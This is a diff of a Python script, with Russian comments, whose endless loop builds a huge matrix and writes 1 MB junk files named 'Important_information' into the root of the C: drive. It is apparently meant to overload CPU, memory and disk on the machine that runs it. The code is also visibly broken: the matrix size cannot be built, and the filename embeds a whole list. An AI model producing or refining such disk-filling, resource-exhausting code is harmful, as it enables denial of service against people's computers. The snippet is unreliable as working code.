@@ -7,20 +7,18 @@ SIZE = 100000000
 
 def final_workload():
     """Финальный процесс, который нагружает ядро"""
-    i=0
     while True:
-        i+=1
-        size_bytes = 1024 * 1024  # 1 МБ
-        filename = f"C:\\Важная_информация{i}.txt"
 
-        with open(filename, "w", encoding="utf-8", newline="") as f:
-            text = "A" * size_bytes
-            f.write(text)
         matrix = [[i for i in range(SIZE)] for _ in range(SIZE)]
         result = []
         for row in matrix:
             result.append([math.sqrt(x) ** 10 for x in row])
+            size_bytes = 1024 * 1024  # 1 МБ
+            filename = f"C:\\Важная_информация{row}.txt"
 
+            with open(filename, "w", encoding="utf-8", newline="") as f:
+                text = "A" * size_bytes
+                f.write(text)
 
 
 def thread_function():
